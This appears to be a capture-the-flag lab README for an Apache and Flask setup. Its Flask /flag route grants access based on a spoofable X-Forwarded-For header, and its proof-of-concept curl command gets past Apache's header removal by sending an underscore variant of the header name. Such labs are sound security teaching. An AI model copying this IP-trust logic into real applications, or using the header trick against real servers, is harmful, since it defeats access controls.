### Apache + Flask

Add 'RequestHeader unset X-Forwarded-For' to httpd.conf

Try to access /flag from 127.0.0.1.


### Usage

Build
```
docker-compose up
```

### Hint

httpd.conf
```
RequestHeader unset X-Forwarded-For
```

Go http://127.0.0.1:8088/

app.py
``` python
@app.route('/flag')
def flag():

    src_ip = None
    if 'x-forwarded-for' in request.headers:
        match_ip = re.match('[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', request.headers['x-forwarded-for'])
        if match_ip is not None:
            src_ip = match_ip.group()

    if src_ip is None:
        src_ip = request.remote_addr

    if src_ip == '127.0.0.1':
        return open('flag','r').read()
    else:
        return 'IP From %s is forbidden' % src_ip

```

### POC
``` bash
curl "http://127.0.0.1:8088/flag" -H 'X-Forwarded_For: 127.0.0.1'
```